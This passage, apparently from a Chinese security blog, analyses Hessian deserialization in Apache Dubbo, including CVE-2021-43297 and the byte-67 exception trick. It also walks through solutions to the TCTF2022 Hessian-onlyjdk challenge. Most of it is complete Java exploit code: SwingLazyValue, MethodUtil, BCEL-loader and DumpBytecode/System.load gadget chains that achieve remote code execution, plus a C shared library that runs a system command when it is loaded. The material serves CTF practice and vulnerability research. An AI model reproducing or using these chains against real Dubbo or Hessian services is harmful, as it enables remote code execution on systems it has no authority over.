class="hljs-name">dependency</span>&gt;</span></span><span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.dubbo<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span></span><span class="language-xml"></span><span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>dubbo<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span></span><span class="language-xml"></span><span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.7.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span></span><span class="language-xml"></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></span><span class="hljs-keyword">import</span> com.alibaba.com.caucho.hessian.io.Hessian2Input;<span class="hljs-keyword">import</span> com.alibaba.com.caucho.hessian.io.Hessian2Output;<span class="hljs-keyword">import</span> com.alibaba.com.caucho.hessian.io.HessianInput;<span class="hljs-keyword">import</span> com.alibaba.com.caucho.hessian.io.HessianOutput;</code></pre></div><h3 id="JdbcRowSetImpl-1"><a href="#JdbcRowSetImpl-1" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p>如果反序列化map对象，在逻辑后面通过put操作，从而触发对key调用hashCode打ROME</p><p>正常打应该是没问题的，因为还是走map.put</p><p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304132426245.png" alt="image-20240304132426245"></p><h3 id="TemplatesImpl-（行不通"><a href="#TemplatesImpl-（行不通" class="headerlink" title="TemplatesImpl （行不通"></a>TemplatesImpl （行不通</h3><p>但这里像我们上述分析的就不行了</p><blockquote><p>unknown说法：</p><p>原生hessian底层反序列化时，用的unsafe创建对象，与构造函数无关。</p><p>alibaba改写的hessian反序列化时，用的JavaDeserializer，会自动挨个测试构造器直到成功</p><p>先调用构造方法，属性传null，创建出对象后再设置属性。</p><p>因为HotSwappableTargetSource和SignedObject构造方法传参null会报错，所以这两个用不了。</p></blockquote><p>我也发现了他说的这些区别</p><p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304132628672.png" alt="image-20240304132628672"></p><p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304132725956.png" alt="image-20240304132725956"></p><p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304132742378.png" alt="image-20240304132742378"></p><p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304132847307.png" alt="image-20240304132847307"></p><p>这一步之后就报错了结束了</p><p>具体也不知道咋修改</p><h2 id="Apache-Dubbo-Hessian2异常处理反序列化漏洞（CVE-2021-43297）"><a href="#Apache-Dubbo-Hessian2异常处理反序列化漏洞（CVE-2021-43297）" class="headerlink" title="Apache Dubbo Hessian2异常处理反序列化漏洞（CVE-2021-43297）"></a>Apache Dubbo Hessian2异常处理反序列化漏洞（CVE-2021-43297）</h2><p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304133410055.png" alt="image-20240304133410055"></p><p>如果在使用Hessian2进行反序列化时抛出异常，则会进行字符串拼接操作，进而调用obj的toString()方法</p><p>寻找谁调用了expect方法</p><p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304142425270.png" alt="image-20240304142425270"></p><p>这里以<code>readString</code>为例，如果tag在switch语句中失配，就会进入default分支的except方法。其他的read方法同理。</p><div class="code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-title">readString</span><span class="hljs-params">()</span> throws IOException </span>&#123;        <span class="hljs-type">int</span> tag = <span class="hljs-keyword">this</span>.<span class="hljs-built_in">read</span>();        <span class="hljs-type">int</span> ch;        <span class="hljs-keyword">switch</span> (tag) &#123;            <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:.。。。            <span class="hljs-keyword">case</span> <span class="hljs-number">126</span>:            <span class="hljs-keyword">case</span> <span class="hljs-number">127</span>:            <span class="hljs-keyword">default</span>:                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">this</span>.<span class="hljs-built_in">expect</span>(<span class="hljs-string">&quot;string&quot;</span>, tag);            ......        &#125;    &#125;</code></pre></div><p>Boogipop大佬因为搭建了dubbo环境，他是从rpc通信的角度进行利用</p><p>但反序列化一般关注的是 readObject, 所以我们研究如何从 readObject 走到 readString, 进而走到 expect</p><div class="code-wrapper"><pre><code class="hljs gradle"><span class="hljs-keyword">public</span> Object readObject(<span class="hljs-keyword">Class</span> expectedClass, <span class="hljs-keyword">Class</span>&lt;?&gt;... expectedTypes) <span class="hljs-keyword">throws</span> IOException &#123;    <span class="hljs-keyword">if</span> (expectedClass == <span class="hljs-keyword">null</span> || expectedClass == Object.<span class="hljs-keyword">class</span>)        <span class="hljs-keyword">return</span> readObject();    <span class="hljs-keyword">int</span> tag = _offset &lt; _length ? (_buffer[_offset++] &amp; <span class="hljs-number">0</span>xff) : <span class="hljs-keyword">read</span>();    <span class="hljs-keyword">switch</span> (tag) &#123;        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;N&#x27;</span>:            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;H&#x27;</span>: &#123;。。。。。。        &#125;        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;M&#x27;</span>: &#123;。。。。。        &#125;        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;C&#x27;</span>: &#123;            readObjectDefinition(expectedClass);            <span class="hljs-keyword">return</span> readObject(expectedClass);        &#125;。。。。。。。。</code></pre></div><p>发现当tag为”C”，即<code>67</code>时会调用<code>readObjectDefinition</code></p><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-keyword">private</span> void read<span class="hljs-constructor">ObjectDefinition(Class <span class="hljs-params">cl</span>)</span>        throws IOException &#123;    String <span class="hljs-keyword">type</span> = read<span class="hljs-constructor">String()</span>;    <span class="hljs-built_in">int</span> len = read<span class="hljs-constructor">Int()</span>;    String<span class="hljs-literal">[]</span> fieldNames = <span class="hljs-keyword">new</span> String<span class="hljs-literal">[<span class="hljs-identifier">len</span>]</span>;    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++)        fieldNames<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span> = read<span class="hljs-constructor">String()</span>;    ObjectDefinition def = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectDefinition(<span class="hljs-params">type</span>, <span class="hljs-params">fieldNames</span>)</span>;    <span class="hljs-keyword">if</span> (_classDefs<span class="hljs-operator"> == </span>null)        _classDefs = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ArrayList()</span>;    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_classDefs</span>.</span></span>add(def);&#125;</code></pre></div><p>调用了readString</p><p>所以现在就是如何让tag的值为67</p><h3 id="网上看到的一些方法都是选择重写-writeString-指定第一次-read-的-tag-为-67"><a href="#网上看到的一些方法都是选择重写-writeString-指定第一次-read-的-tag-为-67" class="headerlink" title="网上看到的一些方法都是选择重写 writeString 指定第一次 read 的 tag 为 67"></a>网上看到的一些方法都是选择重写 writeString 指定第一次 read 的 tag 为 67</h3><p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304154845999.png" alt="image-20240304154845999"></p><p>重写逻辑为这样</p><p>然后在序列化之前wirteString(“aaa”)即可</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>(); <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(byteArrayOutputStream); out.writeString(<span class="hljs-string">&quot;aaa&quot;</span>); out.writeObject(o);</code></pre></div><p>在网鼎杯2022 BadBean Hessian2中</p><p>序列化时会报<code>HikariDataSource</code>没有实现Serializable接口的错误，用该方法即可</p><p>但是一般按理来说hessian可以反序列化未实现serializable接口的类</p><h3 id="X1r0z大佬做法"><a href="#X1r0z大佬做法" class="headerlink" title="X1r0z大佬做法"></a>X1r0z大佬做法</h3><p>因为 hessian 在读入的时候是按一个个 byte 来读的,在 readObject 里面第一次调用的 <code>this.read()</code> 读取的是序列化后的 byte 数组里的第一个值, 所以只要在 byte 数组的前面再拼一个 67 就行了</p><p>woc，这位佬的思路总是那么惊人</p><div class="code-wrapper"><pre><code class="hljs java">      <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();      person.setAge(<span class="hljs-number">18</span>);      person.setName(<span class="hljs-string">&quot;lingRu&quot;</span>);      <span class="hljs-type">byte</span>[] serialize = serialize(person);<span class="hljs-type">byte</span>[] data = Serialization.hessian2Serialize(person);      <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];      System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);      System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length);      Serialization.hessian2Unserialize(poc);</code></pre></div><p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304151343061.png" alt="image-20240304151343061"></p><p>至于 readString 里面读的第二个 tag 其实也不用考虑, 因为写入的 object 本来就不是 String 类型的, 最终都能够走到 <code>throw this.expect(&quot;string&quot;, tag)</code></p><h3 id="Boogipop大佬"><a href="#Boogipop大佬" class="headerlink" title="Boogipop大佬"></a>Boogipop大佬</h3><p>牛波一</p><div class="code-wrapper"><pre><code class="hljs">    ByteArrayOutputStream baos = new ByteArrayOutputStream();    Hessian2Output out = new Hessian2Output(baos);    baos.write(67);    out.getSerializerFactory().setAllowNonSerializable(true);    out.writeObject(s);</code></pre></div><h3 id="实际触发点不止67一个"><a href="#实际触发点不止67一个" class="headerlink" title="实际触发点不止67一个"></a>实际触发点不止67一个</h3><ol><li>case 77 调用 readtype ，进入 readInt 触发expect</li><li>case 79 调用 readInt 触发expect</li><li>case 81 调用 readInt 触发expect</li></ol><h2 id="没有实现Serializable接口的处理方法"><a href="#没有实现Serializable接口的处理方法" class="headerlink" title="没有实现Serializable接口的处理方法"></a>没有实现Serializable接口的处理方法</h2><p>当你要序列化的类时会报没有实现<code>Serializable</code>接口的错误，直接重写<code>com.alibaba.com.caucho.hessian.io.SerializerFactory#getDefaultSerializer</code>加上一行</p><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">this._isAllowNonSerializable</span> = <span class="hljs-literal">true</span></code></pre></div><p>[<img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/cc0f18a0-d199-8b42-fb2d-6a095ece5a05.png" alt="image.png"></p><h3 id="或者"><a href="#或者" class="headerlink" title="或者"></a>或者</h3><div class="code-wrapper"><pre><code class="hljs reasonml">HessianBase.NoWriteReplaceSerializerFactory sf = <span class="hljs-keyword">new</span> HessianBase.<span class="hljs-constructor">NoWriteReplaceSerializerFactory()</span>;sf.set<span class="hljs-constructor">AllowNonSerializable(<span class="hljs-params">true</span>)</span>;output.set<span class="hljs-constructor">SerializerFactory(<span class="hljs-params">sf</span>)</span>;</code></pre></div><h3 id="其实一句代码就能解决"><a href="#其实一句代码就能解决" class="headerlink" title="其实一句代码就能解决"></a>其实一句代码就能解决</h3><div class="code-wrapper"><pre><code class="hljs reasonml">oo.get<span class="hljs-constructor">SerializerFactory()</span>.set<span class="hljs-constructor">AllowNonSerializable(<span class="hljs-params">true</span>)</span>;</code></pre></div><div class="code-wrapper"><pre><code class="hljs reasonml">ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;Hessian2Output out = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Hessian2Output(<span class="hljs-params">baos</span>)</span>;baos.write(<span class="hljs-number">67</span>);out.get<span class="hljs-constructor">SerializerFactory()</span>.set<span class="hljs-constructor">AllowNonSerializable(<span class="hljs-params">true</span>)</span>;out.write<span class="hljs-constructor">Object(<span class="hljs-params">s</span>)</span>;</code></pre></div><h2 id="Hessian-onlyjdk-TCTF2022"><a href="#Hessian-onlyjdk-TCTF2022" class="headerlink" title="Hessian-onlyjdk   TCTF2022"></a>Hessian-onlyjdk   TCTF2022</h2><p>基于上述hessian2的toString漏洞，然后找原生类进行利用</p><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><div class="code-wrapper"><pre><code class="hljs reasonml">import com.caucho.hessian.io.Hessian2Input;import com.caucho.hessian.io.Hessian2Output;import com.sun.org.apache.bcel.internal.Repository;import com.sun.org.apache.bcel.internal.classfile.JavaClass;import com.sun.org.apache.bcel.internal.classfile.Utility;import sun.reflect.ReflectionFactory;import sun.security.pkcs.PKCS9Attribute;import sun.security.pkcs.PKCS9Attributes;import sun.swing.SwingLazyValue;import javax.swing.*;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;<span class="hljs-comment">// 前提条件:CVE-2021-43297,打toString()</span>public <span class="hljs-keyword">class</span> Hessian_JavaWrapper &#123;    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;        PKCS9Attributes s = create<span class="hljs-constructor">WithoutConstructor(PKCS9Attributes.<span class="hljs-params">class</span>)</span>;        UIDefaults uiDefaults = <span class="hljs-keyword">new</span> <span class="hljs-constructor">UIDefaults()</span>;        JavaClass evil = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Repository</span>.</span></span>lookup<span class="hljs-constructor">Class(<span class="hljs-params">test</span>.<span class="hljs-params">class</span>)</span>;        String payload = <span class="hljs-string">&quot;$$BCEL$$&quot;</span> + <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Utility</span>.</span></span>encode(evil.get<span class="hljs-constructor">Bytes()</span>, <span class="hljs-literal">true</span>);        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-constructor">SwingLazyValue(<span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper&quot;</span>, <span class="hljs-string">&quot;_main&quot;</span>, <span class="hljs-params">new</span> Object[]&#123;<span class="hljs-params">new</span> String[]&#123;<span class="hljs-params">payload</span>&#125;&#125;)</span>);        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">s</span>,<span class="hljs-string">&quot;attributes&quot;</span>,<span class="hljs-params">uiDefaults</span>)</span>;        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;        Hessian2Output out = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Hessian2Output(<span class="hljs-params">baos</span>)</span>;        baos.write(<span class="hljs-number">67</span>);        out.get<span class="hljs-constructor">SerializerFactory()</span>.set<span class="hljs-constructor">AllowNonSerializable(<span class="hljs-params">true</span>)</span>;        out.write<span class="hljs-constructor">Object(<span class="hljs-params">s</span>)</span>;        out.flush<span class="hljs-constructor">Buffer()</span>;        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayInputStream(<span class="hljs-params">baos</span>.<span class="hljs-params">toByteArray</span>()</span>);        Hessian2Input input = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Hessian2Input(<span class="hljs-params">bais</span>)</span>;        input.read<span class="hljs-constructor">Object()</span>;    &#125;    public static &lt;T&gt; T create<span class="hljs-constructor">WithoutConstructor(Class&lt;T&gt; <span class="hljs-params">classToInstantiate</span>)</span> throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;        return create<span class="hljs-constructor">WithConstructor(<span class="hljs-params">classToInstantiate</span>, Object.<span class="hljs-params">class</span>, <span class="hljs-params">new</span> Class[0], <span class="hljs-params">new</span> Object[0])</span>;    &#125;    public static &lt;T&gt; T create<span class="hljs-constructor">WithConstructor(Class&lt;T&gt; <span class="hljs-params">classToInstantiate</span>, Class&lt;? <span class="hljs-params">super</span> T&gt; <span class="hljs-params">constructorClass</span>, Class&lt;?&gt;[] <span class="hljs-params">consArgTypes</span>, Object[] <span class="hljs-params">consArgs</span>)</span> throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;        Constructor&lt;? super T&gt; objCons = constructorClass.get<span class="hljs-constructor">DeclaredConstructor(<span class="hljs-params">consArgTypes</span>)</span>;        objCons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        Constructor&lt;?&gt; sc = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ReflectionFactory</span>.</span></span>get<span class="hljs-constructor">ReflectionFactory()</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">ConstructorForSerialization(<span class="hljs-params">classToInstantiate</span>, <span class="hljs-params">objCons</span>)</span>;        sc.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        return (T) sc.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">consArgs</span>)</span>;    &#125;    public static void set<span class="hljs-constructor">FieldValue(Object <span class="hljs-params">obj</span>, String <span class="hljs-params">fieldName</span>, Object <span class="hljs-params">value</span>)</span> throws Exception &#123;        Field field = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">fieldName</span>)</span>;        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        field.set(obj, value);    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">_main</span><span class="hljs-params">(String[] argv)</span> <span class="hljs-keyword">throws</span> IOException&#123;        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);    &#125;&#125;</code></pre></div><h4 id="几大细节"><a href="#几大细节" class="headerlink" title="几大细节"></a>几大细节</h4><ol><li><code>SwingLazyValue#createValue</code>中可以触发任意类的任意方法，那么就可以实现RCE（其实并不是任意，需要静态和public这两个条件)</li></ol><p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304192321968.png" alt="image-20240304192321968"></p><ol start="2"><li><p>让他执行<code>JavaWrapper._main</code>，我们只需要创建一个恶意类，其中带一个方法名叫<code>_main</code>然后让他加载那么就可以执行命令了</p></li><li><p>PKCS9Attributes没有无参构造，使用魔术类绕过构造方法</p></li></ol><p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240304191801666.png" alt="image-20240304191801666"></p><p>跑个代码看个乐子</p><h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>MimeTypeParameterList + SwingLazyValue + MethodUtil.invoke</p><div class="code-wrapper"><pre><code class="hljs reasonml">UIDefaults uiDefaults = <span class="hljs-keyword">new</span> <span class="hljs-constructor">UIDefaults()</span>;Method invokeMethod = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;sun.reflect.misc.MethodUtil&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredMethod(<span class="hljs-string">&quot;invoke&quot;</span>, Method.<span class="hljs-params">class</span>, Object.<span class="hljs-params">class</span>, Object[].<span class="hljs-params">class</span>)</span>;Method exec = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.<span class="hljs-params">class</span>)</span>;SwingLazyValue slz = <span class="hljs-keyword">new</span> <span class="hljs-constructor">SwingLazyValue(<span class="hljs-string">&quot;sun.reflect.misc.MethodUtil&quot;</span>, <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-params">new</span> Object[]&#123;<span class="hljs-params">invokeMethod</span>, <span class="hljs-params">new</span> Object()</span>, <span class="hljs-keyword">new</span> Object<span class="hljs-literal">[]</span>&#123;exec, <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span>, <span class="hljs-keyword">new</span> Object<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;&#125;&#125;);uiDefaults.put(<span class="hljs-string">&quot;key&quot;</span>, slz);MimeTypeParameterList mimeTypeParameterList = <span class="hljs-keyword">new</span> <span class="hljs-constructor">MimeTypeParameterList()</span>;set<span class="hljs-constructor">FieldValue(<span class="hljs-params">mimeTypeParameterList</span>,<span class="hljs-string">&quot;parameters&quot;</span>,<span class="hljs-params">uiDefaults</span>)</span>;ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;Hessian2Output out = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Hessian2Output(<span class="hljs-params">baos</span>)</span>;baos.write(<span class="hljs-number">67</span>);out.get<span class="hljs-constructor">SerializerFactory()</span>.set<span class="hljs-constructor">AllowNonSerializable(<span class="hljs-params">true</span>)</span>;out.write<span class="hljs-constructor">Object(<span class="hljs-params">mimeTypeParameterList</span>)</span>;out.flush<span class="hljs-constructor">Buffer()</span>;ByteArrayInputStream bais = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayInputStream(<span class="hljs-params">baos</span>.<span class="hljs-params">toByteArray</span>()</span>);Hessian2Input input = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Hessian2Input(<span class="hljs-params">bais</span>)</span>;input.read<span class="hljs-constructor">Object()</span>;</code></pre></div><h3 id="解法三（写文件）"><a href="#解法三（写文件）" class="headerlink" title="解法三（写文件）"></a>解法三（写文件）</h3><p>MimeTypeParameterList+ProxyLazyValue+DumpBytecode.dumpBytecode+System.load</p><div class="code-wrapper"><pre><code class="hljs pgsql">    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) throws <span class="hljs-keyword">Exception</span> &#123;        Unsafe unsafe = getUnsafe();        <span class="hljs-keyword">Object</span> script = unsafe.allocateInstance(ScriptEnvironment.<span class="hljs-keyword">class</span>);        setFieldValue(script,&quot;_dest_dir&quot;,&quot;/tmp/&quot;);        <span class="hljs-keyword">Object</span> <span class="hljs-keyword">debug</span>=unsafe.allocateInstance(DebugLogger.<span class="hljs-keyword">class</span>);        byte[] code= Files.readAllBytes(Paths.<span class="hljs-keyword">get</span>(&quot;./calc.so&quot;));        String classname=&quot;calc&quot;;        //写文件        UIDefaults.ProxyLazyValue proxyLazyValue = <span class="hljs-built_in">new</span> UIDefaults.ProxyLazyValue(&quot;jdk.nashorn.internal.codegen.DumpBytecode&quot;, &quot;dumpBytecode&quot;, <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;                script,                <span class="hljs-keyword">debug</span>,                code,                classname        &#125;);        //<span class="hljs-keyword">System</span>.<span class="hljs-keyword">load</span>加载so文件//        UIDefaults.ProxyLazyValue proxyLazyValue = <span class="hljs-built_in">new</span> UIDefaults.ProxyLazyValue(&quot;java.lang.System&quot;, &quot;load&quot;, <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;//                &quot;/tmp/calc.class&quot;//        &#125;);        setFieldValue(proxyLazyValue,&quot;acc&quot;,<span class="hljs-keyword">null</span>);        UIDefaults uiDefaults = <span class="hljs-built_in">new</span> UIDefaults();        uiDefaults.put(&quot;key&quot;, proxyLazyValue);        <span class="hljs-keyword">Class</span> clazz = <span class="hljs-keyword">Class</span>.forName(&quot;java.awt.datatransfer.MimeTypeParameterList&quot;);        <span class="hljs-keyword">Object</span> mimeTypeParameterList = unsafe.allocateInstance(clazz);        setFieldValue(mimeTypeParameterList, &quot;parameters&quot;, uiDefaults);        ByteArrayOutputStream baos = <span class="hljs-built_in">new</span> ByteArrayOutputStream();        Hessian2Output <span class="hljs-keyword">out</span> = <span class="hljs-built_in">new</span> Hessian2Output(baos);        baos.<span class="hljs-keyword">write</span>(<span class="hljs-number">67</span>);        <span class="hljs-keyword">out</span>.getSerializerFactory().setAllowNonSerializable(<span class="hljs-keyword">true</span>);        <span class="hljs-keyword">out</span>.writeObject(mimeTypeParameterList);        <span class="hljs-keyword">out</span>.flushBuffer();        ByteArrayInputStream bais = <span class="hljs-built_in">new</span> ByteArrayInputStream(baos.toByteArray());        Hessian2Input input = <span class="hljs-built_in">new</span> Hessian2Input(bais);        <span class="hljs-keyword">input</span>.readObject();    &#125;    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> setFieldValue(<span class="hljs-keyword">Object</span> obj, String fieldName, <span class="hljs-keyword">Object</span> <span class="hljs-keyword">value</span>) throws <span class="hljs-keyword">Exception</span> &#123;        Field field = obj.getClass().getDeclaredField(fieldName);        field.setAccessible(<span class="hljs-keyword">true</span>);        field.<span class="hljs-keyword">set</span>(obj, <span class="hljs-keyword">value</span>);    &#125;    <span class="hljs-built_in">public</span> static Unsafe getUnsafe() throws <span class="hljs-keyword">Exception</span>&#123;        <span class="hljs-keyword">Class</span>&lt;?&gt; aClass = <span class="hljs-keyword">Class</span>.forName(&quot;sun.misc.Unsafe&quot;);        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor();        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);        Unsafe unsafe= (Unsafe) declaredConstructor.newInstance();        <span class="hljs-keyword">return</span> unsafe;    &#125;</code></pre></div><p>写一个文件名为.class的so文件，然后使用System.load加载，因为System.load不管后缀是什么都可以执行</p><p><code>gcc -c calc.c -o calc &amp;&amp; gcc calc --share -o calc.so</code></p><div class="code-wrapper"><pre><code class="hljs sqf"><span class="hljs-meta">#<span class="hljs-keyword">include</span> &lt;stdlib.h&gt;</span><span class="hljs-meta">#<span class="hljs-keyword">include</span> &lt;stdio.h&gt;</span>void <span class="hljs-variable">__attribute__</span> ((<span class="hljs-variable">__constructor__</span>))  calc ()&#123;    system(<span class="hljs-string">&quot;calc&quot;</span>);&#125;</code></pre></div><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>直接走的Hashtable.equals这个入口，不从tostring()走</p><div class="code-wrapper"><pre><code class="hljs reasonml">import java.lang.reflect.Array;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;import com.caucho.hessian.io.*;import java.io.*;import java.util.HashMap;import javax.swing.UIDefaults;import sun.swing.SwingLazyValue;public <span class="hljs-keyword">class</span> Hessian_onlyJdk &#123;    public static void main(final String<span class="hljs-literal">[]</span> args) throws Exception &#123;        Method invokeMethod = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;sun.reflect.misc.MethodUtil&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredMethod(<span class="hljs-string">&quot;invoke&quot;</span>, Method.<span class="hljs-params">class</span>, Object.<span class="hljs-params">class</span>, Object[].<span class="hljs-params">class</span>)</span>;        Method exec = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.<span class="hljs-params">class</span>)</span>;        SwingLazyValue slz = <span class="hljs-keyword">new</span> <span class="hljs-constructor">SwingLazyValue(<span class="hljs-string">&quot;sun.reflect.misc.MethodUtil&quot;</span>, <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-params">new</span> Object[]&#123;<span class="hljs-params">invokeMethod</span>, <span class="hljs-params">new</span> Object()</span>, <span class="hljs-keyword">new</span> Object<span class="hljs-literal">[]</span>&#123;exec, <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span>, <span class="hljs-keyword">new</span> Object<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;&#125;&#125;);        UIDefaults uiDefaults1 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">UIDefaults()</span>;        uiDefaults1.put(<span class="hljs-string">&quot;_&quot;</span>, slz);        UIDefaults uiDefaults2 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">UIDefaults()</span>;        